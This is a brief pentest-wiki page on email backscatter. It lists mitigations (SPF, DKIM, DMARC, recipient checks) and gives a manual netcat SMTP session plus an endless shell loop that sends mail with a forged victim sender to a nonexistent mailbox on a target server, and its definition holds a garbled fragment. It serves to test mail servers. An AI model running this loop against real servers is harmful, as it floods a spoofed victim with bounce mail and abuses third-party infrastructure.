---
title : "Backscatter"
# pre : ' '
description : "Backscatter is the incorrectly automated bounce messages sent by mail servers, typically as a side effect of incoming spam.can be used."
date : 2020-07-03T09:33:43+02:00
# hidden : true
# draft : true
weight : 150
# tags : ['']
---

---

Backscatter is the incorrectly automated bounce messages sent by mail servers, typically as a side effect of incoming spam.can be used.

### Solution

```plain
- Implement anti-forgery checks - SPF, DKIM and DMARC
- Implement recepient checks for acceptance of e-mail
- If above not possible disable NDR reports
```

## Examples

### Single test

```plain
nc 10.10.10.10 25
EHLO example.com
MAIL FROM:victim@example.com
RCPT TO:notexistingmailbox@target.com
DATA
backscatter testdata
.
```

### Automated test

Create a file with this content (backscatter.txt)

```plain
EHLO example.com
MAIL FROM:victim@example.com
RCPT TO:notexistingmailbox@target.com
DATA
backscatter testdata
.
```

```plain
#!/bin/sh
while true;
do
    cat backscatter.txt | while read L; do sleep "1"; echo "$L"; done | "nc" -w 3 -C -v "<target-ip>" "25";
done
```

## URL List

- [Wikipedia.org - Backscatter](https://en.wikipedia.org/wiki/Backscatter_(email))
